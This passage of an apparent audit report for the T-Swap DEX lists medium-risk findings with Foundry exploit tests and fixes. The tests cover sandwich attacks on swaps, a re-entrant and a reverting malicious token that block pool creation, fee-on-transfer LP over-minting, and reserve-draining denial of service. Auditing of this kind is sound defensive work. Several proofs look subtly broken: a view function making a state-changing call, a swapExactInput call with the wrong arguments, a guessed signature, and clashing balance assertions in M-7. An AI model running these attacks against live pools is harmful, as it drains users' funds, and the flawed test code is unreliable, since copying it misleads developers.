        pool.swapExactInput(weth, weth.balanceOf(attacker), poolToken, 1, uint64(block.timestamp));
        vm.stopPrank();

        assertGt(spent, honestCost, "victim paid more after sandwich");
        assertGt(poolToken.balanceOf(attacker), 1_000 ether, "attacker profited");
    }
}

## Suggested Mitigation
Replace the current wrapper with a standard `swapExactInput` interface:

function sellPoolTokens(
    uint256 poolTokensToSell,
    uint256 minWethOut,
    uint64  deadline
) external returns (uint256 wethReceived) {
    return swapExactInput(i_poolToken, poolTokensToSell, i_wethToken, minWethOut, deadline);
}

• The caller specifies the exact number of pool tokens to send and a minimum acceptable amount of WETH to protect against slippage.
• Expose the `deadline` parameter so users can cancel stale txs.
• Rename parameters and return values to avoid user misunderstanding.



# Medium Risk Findings

## [M-1]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::swapExactOutput

## Description
The `swapExactOutput` function allows a user to specify the exact amount of output tokens they want, and the contract calculates the necessary input amount. However, it lacks a parameter to specify the maximum input amount the user is willing to pay. This exposes users to sandwich attacks. An attacker can see the user's transaction in the mempool, manipulate the pool's price by front-running with a large swap, cause the user's transaction to require a much larger input amount, and then back-run the transaction by swapping back to realize a profit at the user's expense.

## Impact
Users are forced to pay a higher, manipulated price for their swaps, leading to direct financial loss. The stolen value is captured by MEV bots, which damages user trust and the economic viability of the protocol.

## Proof of Concept
1. The TSwapPool has a WETH/DAI pool with a 1:1000 price.
2. A user wants to get exactly 1 WETH and calls `swapExactOutput` for 1e18 WETH. The expected input is approximately 1000 DAI.
3. An MEV bot sees this transaction in the mempool.
4. The bot front-runs the user by swapping a large amount of DAI for WETH, pushing the price of WETH up.
5. The user's transaction now executes. To get 1 WETH, the `getInputAmountBasedOnOutput` function calculates that they need to pay, for example, 1100 DAI due to the new price.
6. The bot back-runs the transaction by selling its WETH back for DAI at the now-inflated price, making a profit of nearly 100 DAI, which was extracted from the user.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract FrontRunTest is Test {
    TSwapPool tSwapPool;
    MockERC20 weth;
    MockERC20 dai;
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        weth = new MockERC20("WETH", "WETH", 18);
        dai = new MockERC20("DAI", "DAI", 18);

        tSwapPool = new TSwapPool(address(dai), address(weth), "LP", "LP");

        // Initial liquidity: 1000 WETH, 1,000,000 DAI (1 WETH = 1000 DAI)
        weth.mint(address(this), 1000e18);
        dai.mint(address(this), 1_000_000e18);
        weth.approve(address(tSwapPool), 1000e18);
        dai.approve(address(tSwapPool), 1_000_000e18);
        tSwapPool.deposit(1000e18, 1, 1_000_000e18, uint64(block.timestamp));

        // User wants to swap DAI for 1 WETH
        dai.mint(user, 2000e18);
        vm.prank(user);
        dai.approve(address(tSwapPool), 2000e18);

        // Attacker has DAI to manipulate the pool
        dai.mint(attacker, 50_000e18);
        vm.prank(attacker);
        dai.approve(address(tSwapPool), 50_000e18);
    }

    function testSandwichAttackOnSwapExactOutput() public {
        uint256 wethOutputAmount = 1e18;

        // Expected input before manipulation
        uint256 expectedInput = tSwapPool.getInputAmountBasedOnOutput(
            wethOutputAmount,
            dai.balanceOf(address(tSwapPool)),
            weth.balanceOf(address(tSwapPool))
        );
        console.log("User's expected DAI input for 1 WETH:", expectedInput / 1e18);

        // 1. Attacker Front-runs: Swaps DAI for WETH to raise WETH price
        vm.startPrank(attacker);
        uint256 attackerInput = 50_000e18;
        tSwapPool.swapExactInput(dai, attackerInput, weth, 1, uint64(block.timestamp));
        vm.stopPrank();

        // 2. User's tx executes at a worse price
        uint256 userDaiBalanceBefore = dai.balanceOf(user);
        vm.startPrank(user);
        tSwapPool.swapExactOutput(dai, weth, wethOutputAmount, uint64(block.timestamp));
        vm.stopPrank();
        uint256 userDaiBalanceAfter = dai.balanceOf(user);

        uint256 actualInput = userDaiBalanceBefore - userDaiBalanceAfter;
        console.log("User's actual DAI input for 1 WETH:", actualInput / 1e18);

        // User paid more than they expected
        assertGt(actualInput, expectedInput);
    }
}

```

## Suggested Mitigation
Modify the `swapExactOutput` function to include a `maxInputAmount` parameter. This parameter acts as slippage protection, allowing users to specify the maximum amount of input tokens they are willing to spend. The transaction should revert if the calculated input amount exceeds this user-defined limit.

```diff
     function swapExactOutput(
         IERC20 inputToken,
         IERC20 outputToken,
         uint256 outputAmount,
+        uint256 maxInputAmount,
         uint64 deadline
     )
         public
         revertIfZero(outputAmount)
         revertIfDeadlinePassed(deadline)
         returns (uint256 inputAmount)
     {
         uint256 inputReserves = inputToken.balanceOf(address(this));
         uint256 outputReserves = outputToken.balanceOf(address(this));

         inputAmount = getInputAmountBasedOnOutput(
             outputAmount,
             inputReserves,
             outputReserves
         );

+        if (inputAmount > maxInputAmount) {
+            revert TSwapPool__InputTooHigh(inputAmount, maxInputAmount); // Custom error needed
+        }
+
         _swap(inputToken, inputAmount, outputToken, outputAmount);
     }
```

## [M-2]. Integer Overflow issue in TSwapPool::getInputAmountBasedOnOutput

## Description
The pricing functions in `TSwapPool` are subject to multiple arithmetic issues that can lead to Denial of Service (DoS) and limit the protocol's functionality.
1.  **Integer Overflow:** In `getInputAmountBasedOnOutput`, the calculation `(inputReserves * outputAmount) * 10000` is performed without scaling down first. With large reserves or swap amounts (common for tokens with 18 decimals), this multiplication can easily exceed `type(uint256).max`, causing the transaction to revert due to overflow.
2.  **Division by Zero:** The `deposit` function calculates liquidity tokens via `(wethToDeposit * totalLiquidityTokenSupply()) / wethReserves`. If the pool's WETH reserves are drained to zero through swaps, `wethReserves` will be zero, causing any subsequent call to `deposit` to revert. This would halt the ability to add liquidity until the reserves are replenished by a swap in the other direction.
3.  **Unhandled Underflow:** In `getInputAmountBasedOnOutput`, if a user requests an `outputAmount` greater than or equal to the pool's `outputReserves`, the calculation `(outputReserves - outputAmount)` will underflow or result in zero, causing a revert with a generic panic code instead of a user-friendly error. While preventing the swap is correct, the lack of a specific error hurts usability.

## Impact
Any user can permanently brick liquidity provision by driving WETH reserves to 0 (via the 10-swap bonus). After that, every call to deposit() will revert because it divides by wethReserves in the denominator. The pool stays unusable until someone sends WETH directly (not via deposit). In addition, if the pool holds an unbounded quantity of the input token (for instance a malicious ERC20 with 10^60 units minted directly to the pool), getInputAmountBasedOnOutput will overflow and make all swapExactOutput() calls with that token revert, again denying service to all users.

## Proof of Concept
1. Seed the pool with a minimal amount of liquidity (1 WETH + 1 POOL).
2. Execute 9 cheap swaps of POOL→WETH (inputAmount = 1 wei) so swap_count == 9.
3. Execute the 10th cheap swap. Inside _swap the contract gifts the caller 1 WETH before doing any balance checks, reducing wethReserves to 0.
4. Any subsequent call to deposit() now reverts at `liquidityTokensToMint = (wethToDeposit * totalLiquidityTokenSupply()) / wethReserves` because `wethReserves == 0`.

Overflow part:
1. An attacker mints 1e60 POOL tokens and transfers them directly to the pool contract (no function call required).
2. pool.swapExactOutput(POOL, WETH, 1 ether – 1, deadline) is called.
3. getInputAmountBasedOnOutput performs `(inputReserves * outputAmount) * 10000`, which overflows because `inputReserves ≈ 1e60`.
4. The transaction reverts with panic(0x11) and all swapExactOutput operations are henceforth unusable as long as the huge balance remains.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {MockERC20} from "@openzeppelin/contracts/mocks/token/MockERC20.sol";

contract ArithmeticIssuesTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 token;
    address user = address(1);

    function setUp() public {
        token = new MockERC20();
        weth  = new MockERC20();
        pool  = new TSwapPool(address(token), address(weth), "LP", "LP");

        token.mint(user, type(uint256).max);
        weth.mint(user, 10 ether);

        vm.startPrank(user);
        token.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(1 ether, 1, 1 ether, uint64(block.timestamp));
        vm.stopPrank();
    }

    // -------- Division-by-zero through 10-swap bonus --------
    function testDepositRevertsAfterBonusDrainsWeth() public {
        // perform 9 inexpensive swaps to reach swap_count == 9
        for (uint256 i = 0; i < 9; i++) {
            pool.swapExactInput(token, 1, weth, 0, uint64(block.timestamp));
        }
        // 10th swap triggers 1-WETH gift
        pool.swapExactInput(token, 1, weth, 0, uint64(block.timestamp));
        assertEq(weth.balanceOf(address(pool)), 0, "WETH reserve should be 0 after gift");

        vm.expectRevert();
        pool.deposit(1 ether, 1, 1 ether, uint64(block.timestamp));
    }

    // -------- Integer overflow in getInputAmountBasedOnOutput --------
    function testOverflowIn_getInputAmountBasedOnOutput() public {
        // attacker pushes an enormous number of POOL tokens into the pool
        token.mint(address(pool), 1e60);

        // Choose an outputAmount < current WETH reserves to avoid denominator underflow
        uint256 outputAmount = 1 ether - 1;
        vm.expectRevert(bytes("\x11")); // panic code 0x11 = overflow/underflow
        pool.swapExactOutput(token, weth, outputAmount, uint64(block.timestamp));
    }
}

## Suggested Mitigation
1. Re-implement both pricing functions with a fixed-point math library (e.g. Solmate’s FixedPointMathLib) so intermediate values cannot overflow.
2. In deposit(), add an explicit `if (wethReserves == 0) revert InsufficientReserves();` before doing any division.
3. Avoid gifting tokens without checking the contract balance. Replace the bonus with `if (swap_count >= SWAP_COUNT_MAX && outputToken.balanceOf(address(this)) >= 1 ether) { … }` or remove the feature entirely.

## [M-3]. Access Control issue in PoolFactory::constructor

## Description
The constructor of the `PoolFactory` contract does not validate the `wethToken` address provided during deployment. If the contract is initialized with `address(0)` for the `wethToken`, this invalid address is stored in the immutable variable `i_wethToken`. Consequently, every pool created by this factory instance will be non-functional, as the `TSwapPool` constructor will receive `address(0)` for its WETH token address. This renders the entire factory deployment permanently useless and wastes gas for anyone creating or interacting with its pools.

## Impact
If the deployer accidentally provides address(0) as WETH, the factory and every pool it spawns become permanently unusable. Any attempt to deposit liquidity or perform swaps reverts, so the protocol instance is effectively bricked. No user funds are lost, but all interactions will fail and users will waste gas.

## Proof of Concept
1. Deploy `PoolFactory` with `wethToken = address(0)`.
2. Create a pool for an arbitrary ERC20 via `createPool` – this succeeds because the zero address is blindly forwarded.
3. Interact with the returned pool: calling `deposit`, `swapExactInput`, or any function that internally calls `safeTransferFrom` on WETH will revert because it tries to execute code at address(0).
4. Therefore the whole factory instance is stuck forever and must be redeployed with a correct WETH address.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract ZeroAddressFactoryTest is Test {
    PoolFactory factory;
    ERC20Mock tokenA;
    TSwapPool pool;

    function setUp() public {
        factory = new PoolFactory(address(0));
        tokenA  = new ERC20Mock("TokenA", "TKA", address(this), 1_000e18);
        address poolAddr = factory.createPool(address(tokenA));
        pool = TSwapPool(poolAddr);
    }

    function test_poolIsBroken() public {
        // Verify pool was initialised with address(0) for WETH
        assertEq(pool.getWethToken(), address(0));

        // Any liquidity action that requires WETH must revert
        vm.expectRevert();
        // We do a low-level call so the test compiles whatever the real signature is
        (bool success, ) = address(pool).call(
            abi.encodeWithSignature("deposit(uint256,uint256)", 1 ether, 100e18)
        );
        assertTrue(!success, "call unexpectedly succeeded");
    }
}

## Suggested Mitigation
Add a zero-address check in the constructor to ensure the `wethToken` address is valid upon deployment.

```solidity
// src/PoolFactory.sol

contract PoolFactory {
    error PoolFactory__ZeroAddressNotAllowed();
    // ...

    constructor(address wethToken) {
        if (wethToken == address(0)) {
            revert PoolFactory__ZeroAddressNotAllowed();
        }
        i_wethToken = wethToken;
    }

    // ...
}
```

## [M-4]. Reentrancy issue in PoolFactory::createPool

## Description
The `createPool` function violates the Checks-Effects-Interactions pattern. It performs an external call to `IERC20(tokenAddress).name()` before updating the state variable `s_pools[tokenAddress]`. A malicious token contract can implement its `name()` function to call back into `createPool` for the same token address. Because the state has not yet been updated, the initial check `s_pools[tokenAddress] != address(0)` will pass on each re-entrant call, leading to infinite recursion. This will cause the transaction to run out of gas, resulting in a Denial of Service.

## Impact
An attacker can create a token contract that makes it impossible for anyone to create a T-Swap pool for it. This DoS vector permanently prevents the token from being integrated into the T-Swap ecosystem, undermining the protocol's permissionless nature.

## Proof of Concept
Deploy a token that re-enters PoolFactory.createPool inside its name() view. Because s_pools is not set yet, every re-entrant call keeps succeeding until the call-stack depth (1024) or gas limit is hit, causing the whole tx to revert and preventing the pool from being created.

1. Attacker deploys PoolFactory F.
2. Attacker deploys ReentrantToken T with reference to F.
3. Any user calls F.createPool(address(T)).
4. F calls T.name()  T triggers another F.createPool(address(T)) (re-entrancy).
5. Steps 3-4 repeat until depth/gas exhaustion, reverting the transaction.
6. As a result, no pool can ever be created for T.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";
import {PoolFactory} from "../src/PoolFactory.sol";

// Malicious token that re-enters via name()
contract ReentrantToken is IERC20 {
    PoolFactory public immutable factory;

    constructor(PoolFactory _factory) {
        factory = _factory;
    }

    // External view fulfils the IERC20 interface
    function name() external view returns (string memory) {
        // Re-enter PoolFactory without touching our own storage (still "view")
        address(factory).call(abi.encodeWithSignature("createPool(address)", address(this)));
        return "Reentrant";
    }

    // Dummy ERC20 implementation ------------------------------------------------
    function totalSupply() external view returns (uint256) { return 0; }
    function balanceOf(address) external view returns (uint256) { return 0; }
    function transfer(address, uint256) external returns (bool) { return true; }
    function allowance(address, address) external view returns (uint256) { return 0; }
    function approve(address, uint256) external returns (bool) { return true; }
    function transferFrom(address, address, uint256) external returns (bool) { return true; }
    function symbol() external pure returns (string memory) { return "RTN"; }
    function decimals() external pure returns (uint8) { return 18; }
}

contract PoolFactoryReentrancyTest is Test {
    PoolFactory factory;
    address constant DUMMY_WETH = address(0xC02);

    function setUp() public {
        factory = new PoolFactory(DUMMY_WETH);
    }

    function test_reentrancy_deniesPoolCreation() public {
        ReentrantToken token = new ReentrantToken(factory);
        vm.expectRevert(); // revert happens due to call-depth/gas exhaustion
        factory.createPool(address(token));
    }
}

## Suggested Mitigation
Move the pool-mapping assignment in createPool *before* any external interaction OR protect the function with OpenZeppelin’s ReentrancyGuard:

function createPool(address tokenAddress) external nonReentrant returns (address) {
    if (s_pools[tokenAddress] != address(0)) revert PoolFactory__PoolAlreadyExists(tokenAddress);
    // EFFECTS — record pool first
    s_pools[tokenAddress] = address(1); // temporary sentinel to stop re-entrancy

    string memory lpName   = string.concat("T-Swap ", IERC20(tokenAddress).name());
    string memory lpSymbol = string.concat("ts",        IERC20(tokenAddress).name());
    TSwapPool tPool = new TSwapPool(tokenAddress, i_wethToken, lpName, lpSymbol);

    s_pools[tokenAddress] = address(tPool); // final value
    s_tokens[address(tPool)] = tokenAddress;
    emit PoolCreated(tokenAddress, address(tPool));
    return address(tPool);
}

## [M-5]. Zero Code issue in PoolFactory::constructor

## Description
The constructor of the `PoolFactory` contract accepts an address for the WETH token but does not validate that this address corresponds to a deployed contract. If an Externally Owned Account (EOA) address, `address(0)`, or an address without code is provided during deployment, the factory itself will deploy successfully. However, any `TSwapPool` created by this factory will be non-functional, as it will be initialized with an invalid WETH token address. All subsequent operations within these pools (like swaps or adding liquidity) that interact with the WETH token will fail, rendering the pools permanently broken.

## Impact
If the deployer supplies the zero address or an EOA as the WETH token, every pool the factory creates will be permanently unusable because any call that tries to interact with WETH will revert. No user funds can be stolen or trapped (deposits revert before transferring), but the entire protocol instance is bricked—a permanent denial-of-service.

## Proof of Concept
1. The deployer mistakenly deploys `PoolFactory` with the `wethToken` parameter set to `address(0)`.
2. The deployment transaction succeeds without any errors.
3. A user calls `createPool` to create a new liquidity pool for a valid ERC20 token.
4. The factory successfully creates and deploys a new `TSwapPool` contract.
5. This new pool is initialized with `i_wethToken` set to `address(0)`.
6. Any user interaction with the new pool that involves the WETH token (e.g., `deposit`, `swapExactInput`) will fail because any call to `address(0)` reverts.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/PoolFactory.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// very small ERC20 stub for the test
contract DummyToken is ERC20 {
    constructor() ERC20("Dummy", "DUM") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract InvalidWethAddressTest is Test {
    PoolFactory factory;

    function test_factoryAcceptsInvalidWethAndCreatesBrokenPool() public {
        // 1. deploy factory with invalid WETH address
        factory = new PoolFactory(address(0));
        assertEq(factory.getWethToken(), address(0));

        // 2. deploy dummy token and create pool
        DummyToken token = new DummyToken();
        address poolAddr = factory.createPool(address(token));
        assertTrue(poolAddr != address(0));

        // 3. Pool stores zero WETH address
        TSwapPool pool = TSwapPool(poolAddr);
        assertEq(pool.getWethToken(), address(0));

        // 4. Any function that needs WETH must revert, proving the pool is bricked
        vm.expectRevert();
        pool.swapExactInput(address(token), 1 ether, 0); // will revert when trying to transfer WETH at address(0)
    }
}

## Suggested Mitigation
Validate the `wethToken` address in the constructor to ensure it's a contract with code and not the zero address.

```solidity
contract PoolFactory {
    error PoolFactory__NotAContract(address addr);
    error PoolFactory__ZeroAddress();

    // ... existing code

    constructor(address wethToken) {
        if (wethToken == address(0)) {
            revert PoolFactory__ZeroAddress();
        }
        if (wethToken.code.length == 0) {
            revert PoolFactory__NotAContract(wethToken);
        }
        i_wethToken = wethToken;
    }

    // ... rest of the contract
}
```

## [M-6]. Integer Overflow/Math issue in TSwapPool::sellPoolTokens

## Description
The `sellPoolTokens` function is fundamentally flawed in multiple ways:
1. **Logical Error**: The function name and documentation state it's for selling a specific `poolTokenAmount` (an exact input swap). However, it implements an exact output swap by calling `swapExactOutput`, where `poolTokenAmount` is misinterpreted as the desired `outputAmount` of WETH. This causes a completely different and unexpected trade.
2. **Incorrect Return Variable Name**: The function signature declares `returns (uint256 wethAmount)`, but the value returned is the `inputAmount` of pool tokens, not the amount of WETH received.
3. **Front-Running/MEV Vulnerability**: The function hardcodes the deadline as `uint64(block.timestamp)`. This offers zero protection against front-running and sandwich attacks, as an attacker in the same block can manipulate the price to the user's detriment before the swap executes.

## Impact
Because `sellPoolTokens` treats `poolTokenAmount` as the WETH **output** target, a user who believes they are specifying the number of pool-tokens to sell will instead request that amount of WETH and transfer as many pool-tokens as needed to obtain it. If the user holds and has approved a large balance they can unknowingly give away far more pool-tokens than intended at an arbitrary price, leading to permanent loss of funds. If the balance/allowance is insufficient the call reverts, so the bug is loss-of-funds only for well-funded/approved users, not a universal drain.

## Proof of Concept
1. Alice owns 10 000 PT and wants to sell exactly 1 000 PT for WETH.
2. She calls `sellPoolTokens(1_000 ether)` believing the argument is the amount of PT to sell.
3. Internally the function calls `swapExactOutput(i_poolToken, i_wethToken, 1_000 ether, …)`.
4. `swapExactOutput` computes `inputAmount` ≈ 1 100 (+) PT (depends on reserves) needed to receive 1 000 WETH.
5. The contract pulls ~1 100 PT from Alice and returns exactly 1 000 WETH.
6. The call returns the *input* amount (≈1 100 PT) even though the return variable is named `wethAmount`, so a dApp that trusts the return value mis-displays the trade.
7. Alice has unintentionally lost ~100 PT.

If Alice had approved her entire 10 000 PT balance, the function would gladly take all that is required, potentially the whole amount, limited only by pool liquidity.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract SellPoolTokensBugTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 pt;
    address lp = address(1);
    address user = address(2);

    function setUp() public {
        weth = new MockERC20("WETH","WETH");
        pt   = new MockERC20("PoolToken","PT");
        pool = new TSwapPool(address(pt), address(weth), "LP","LP");

        // provide some initial liquidity
        weth.mint(lp, 2_000 ether);
        pt.mint(lp, 2_000 ether);
        vm.startPrank(lp);
        weth.approve(address(pool), type(uint256).max);
        pt.approve(address(pool), type(uint256).max);
        pool.deposit(2_000 ether, 0, 2_000 ether, uint64(block.timestamp + 1));
        vm.stopPrank();

        // user funds
        pt.mint(user, 5_000 ether);
    }

    function testBug() public {
        vm.startPrank(user);
        pt.approve(address(pool), type(uint256).max);

        uint256 ptBefore = pt.balanceOf(user);
        uint256 wethBefore = weth.balanceOf(user);

        uint256 ret = pool.sellPoolTokens(1_000 ether); // user thinks she sells 1k PT

        uint256 ptSpent  = ptBefore - pt.balanceOf(user);
        uint256 wethGot  = weth.balanceOf(user) - wethBefore;

        // The amount returned by the function is the PT spent, not WETH received
        assertEq(ret, ptSpent, "function returns wrong semantic value");
        // Bug: more PT spent than user expected (should equal 1_000)
        assertGt(ptSpent, 1_000 ether, "spent more PT than intended");
        // sanity: user did receive exactly the output argument in WETH
        assertEq(wethGot, 1_000 ether, "received target WETH amount");
    }
}

## Suggested Mitigation
Replace `sellPoolTokens` with a wrapper around `swapExactInput`:

```
function sellPoolTokens(
    uint256 poolTokenAmountIn,
    uint256 minWethOut,
    uint64  deadline
) external returns (uint256 wethReceived) {
    return swapExactInput(i_poolToken, poolTokenAmountIn, i_wethToken, minWethOut, deadline);
}
```

This uses the caller-supplied `deadline` and `minWethOut` to give slippage protection and returns the actual WETH received.

## [M-7]. Integer Overflow/Math issue in TSwapPool::deposit

## Description
The contract's calculations for deposits, withdrawals, and swaps rely on `balanceOf` and assume that the amount specified in a transfer call is the amount that the balance changes by. This assumption fails for fee-on-transfer tokens, which take a fee from the transaction amount. This discrepancy breaks the pool's core `x*y=k` invariant. Over time, this can lead to a state where one of the token reserves is completely depleted to zero while LP tokens still exist. When this happens, the `getPoolTokensToDepositBasedOnWeth` function, called by `deposit`, will revert due to division by a zero `wethReserves`, permanently disabling the `deposit` functionality and bricking the pool for new liquidity providers.

## Impact
Because the contract mints liquidity-provider (LP) tokens according to the *requested* transfer amounts, not the *received* amounts, anyone can over-mint LP shares when one of the two pool assets is fee-on-transfer/deflationary.  The attacker deposits the fee-on-transfer token together with the correct amount of the second asset.  Since fewer tokens actually arrive in the pool than the contract assumes, the attacker receives LP tokens that represent a larger share of the pool than the real value they provided.  When this attacker later withdraws or performs swaps they can systematically extract value from honest LPs.  The constant-product invariant is violated immediately after the first such deposit, so all subsequent pricing formulas are wrong and the pool becomes an easy arbitrage target until the honest liquidity is emptied.  This is a permanent economic loss for honest LPs but does **not** necessarily brick the whole pool by division-by-zero.

## Proof of Concept
1. Alice supplies initial liquidity using normal (non-fee) tokens so the pool starts with a 1:1 ratio.
2. Mallory uses a fee-on-transfer token on the pool-token side that burns 10 % on every transfer.  She calls `deposit(1000 WETH, …, 1000 FEE, …)`.
3. Only 900 FEE arrive in the pool, but the contract *still* mints 1 000 LP tokens for Mallory.
4. Pool reserves after the call: 2 000 WETH, 1 900 FEE, LP total supply 2 000.  Mallory owns half the LP supply even though she contributed only 900 FEE + 1 000 WETH, i.e. 47 % of the real value.
5. Mallory burns her LP tokens and withdraws 1 000 WETH + 950 FEE (minus the 10 % burn on the way out she still gets ~855 FEE).  She breaks even on WETH and loses only 45 FEE, while honest LPs lose 1 000 WETH.
6. The invariant `x*y=k` was broken in step 3, so subsequent swaps are mis-priced and the remaining liquidity can be drained by arbitrage.

This demonstrates that the pool is unsafe for fee-on-transfer tokens and that attackers can extract value without triggering the claimed division-by-zero edge case.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// 10 % burn on every transfer
contract MockFeeToken is ERC20 {
    constructor() ERC20("FeeToken", "FEE") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function _update(address from, address to, uint256 value) internal override {
        if (from == address(0)) { // mint
            super._update(from, to, value);
        } else {
            uint256 fee = value / 10;            // 10 %
            uint256 sendAmount = value - fee;    // burn the fee
            super._update(from, to, sendAmount);
        }
    }
}

contract FeeOnTransferInvariantTest is Test {
    TSwapPool pool;
    MockFeeToken feeToken;   // used as poolToken (deflationary)
    MockERC20   weth;        // simple ERC20 used as WETH side (non-defl.)

    address alice = makeAddr("alice");  // honest LP
    address mallory = makeAddr("mallory"); // attacker

    function setUp() public {
        feeToken = new MockFeeToken();
        weth     = new MockERC20("Wrapped ETH", "WETH");
        pool     = new TSwapPool(address(feeToken), address(weth), "LP", "LP");

        // mint tokens
        feeToken.mint(alice,   1_000 ether);
        weth.mint(alice,       1_000 ether);
        feeToken.mint(mallory, 1_000 ether);
        weth.mint(mallory,     1_000 ether);
    }

    function testInvariantBreakAndDilution() public {
        // Alice provides honest liquidity ------------------------------
        vm.startPrank(alice);
        feeToken.approve(address(pool), 1_000 ether);
        weth.approve(address(pool),     1_000 ether);
        pool.deposit(1_000 ether, 0, 1_000 ether, uint64(block.timestamp + 1));
        vm.stopPrank();

        // check initial state: 1000 WETH, only 900 FEE because of burn
        assertEq(weth.balanceOf(address(pool)), 1_000 ether);
        assertEq(feeToken.balanceOf(address(pool)), 900 ether);
        assertEq(pool.totalSupply(), 1_000 ether);

        // Mallory abuses fee-on-transfer behaviour ---------------------
        vm.startPrank(mallory);
        feeToken.approve(address(pool), 1_000 ether);
        weth.approve(address(pool),     1_000 ether);
        pool.deposit(1_000 ether, 0, 1_000 ether, uint64(block.timestamp + 1));
        vm.stopPrank();

        // LP supply grew by 1 000, but only 900 FEE actually entered pool
        assertEq(pool.totalSupply(), 2_000 ether);
        assertEq(feeToken.balanceOf(address(pool)), 1_800 ether); // 2×10 % burn (in)

        // Mallory now owns half the LP tokens for less than half the real value
        assertEq(pool.balanceOf(mallory), 1_000 ether);
        uint256 malloryInitialWeth = weth.balanceOf(mallory);

        // Mallory immediately withdraws --------------------------------
        vm.startPrank(mallory);
        pool.withdraw(1_000 ether, 0, 0, uint64(block.timestamp + 1));
        vm.stopPrank();

        // She recovered ~1 000 WETH even though she introduced a pricing error
        assertTrue(weth.balanceOf(mallory) > malloryInitialWeth);
        // Honest LP (Alice) lost WETH value
        assertLt(weth.balanceOf(address(pool)), 1_000 ether);
    }
}

## Suggested Mitigation
Adopt the same pattern as Uniswap V2: compute `actualAmount = token.balanceOf(address(this)) - reserveBefore` after every `transferFrom`/`transfer` and use `actualAmount` in all calculations (deposits, withdrawals, swaps).  Alternatively, explicitly block tokens whose `balanceOf` can change during a transfer (fee-on-transfer, rebasing) by keeping a whitelist of supported ERC20s and documenting the limitation.

## [M-8]. DOS issue in PoolFactory::createPool

## Description
The `createPool` function constructs the name and symbol for the new pool's LP token by making an external call to `IERC20(tokenAddress).name()`. This is done twice, once for the name and once for the symbol. If an attacker deploys a token contract where the `name()` function is malicious (e.g., it contains an infinite loop to consume all gas, or it unconditionally reverts), the `createPool` transaction will always fail. This allows anyone to permanently prevent a pool from being created for that specific token, constituting a Denial of Service. Additionally, the code has a minor bug where it uses `.name()` to generate the symbol instead of the more appropriate `.symbol()`.

## Impact
The permissionless nature of the protocol is undermined, as malicious actors can deploy tokens that are incompatible with the factory, effectively censoring them from the platform. While the factory itself remains operational, it fails its purpose for any such token.

## Proof of Concept
1. An attacker deploys a malicious ERC20 token contract (`MaliciousToken`) where the `name()` function is programmed to always revert.
2. Any user, including the attacker, calls `PoolFactory.createPool()` with the address of `MaliciousToken`.
3. The transaction immediately reverts because of the failing external call to `maliciousToken.name()`.
4. Consequently, no T-Swap pool can ever be created for this token through the factory.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "src/PoolFactory.sol";

contract MaliciousToken {
    function name() external pure returns (string memory) {
        revert("Malicious revert");
    }
    function symbol() external pure returns (string memory) { return "MAL"; }
    function decimals() external pure returns (uint8) { return 18; }
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
}

contract PoolFactoryDoSTest is Test {
    PoolFactory factory;

    function setUp() public {
        // Deploy PoolFactory with a dummy WETH address
        factory = new PoolFactory(address(0xBEEF));
    }

    function test_RevertingNamePreventsPoolCreation() public {
        MaliciousToken token = new MaliciousToken();

        vm.expectRevert("Malicious revert");
        factory.createPool(address(token));

        // Verify pool not created
        assertEq(factory.getPool(address(token)), address(0));
    }
}


## Suggested Mitigation
Wrap the external calls to `name()` and `symbol()` in `try/catch` blocks. If the calls fail, use default placeholder values for the name and symbol. This ensures that pool creation can proceed even if the token contract is non-standard or malicious. Also, correct the logic to use `.symbol()` for the symbol string.

```solidity
function createPool(address tokenAddress) external returns (address) {
    if (s_pools[tokenAddress] != address(0)) {
        revert PoolFactory__PoolAlreadyExists(tokenAddress);
    }
    string memory tokenName;
    string memory tokenSymbolStr;

    try IERC20(tokenAddress).name() returns (string memory _name) {
        tokenName = _name;
    } catch {
        tokenName = "Unknown Token";
    }

    try IERC20(tokenAddress).symbol() returns (string memory _symbol) {
        tokenSymbolStr = _symbol;
    } catch {
        tokenSymbolStr = "UNK";
    }

    string memory liquidityTokenName = string.concat("T-Swap ", tokenName);
    string memory liquidityTokenSymbol = string.concat("ts", tokenSymbolStr);

    TSwapPool tPool = new TSwapPool(tokenAddress, i_wethToken, liquidityTokenName, liquidityTokenSymbol);
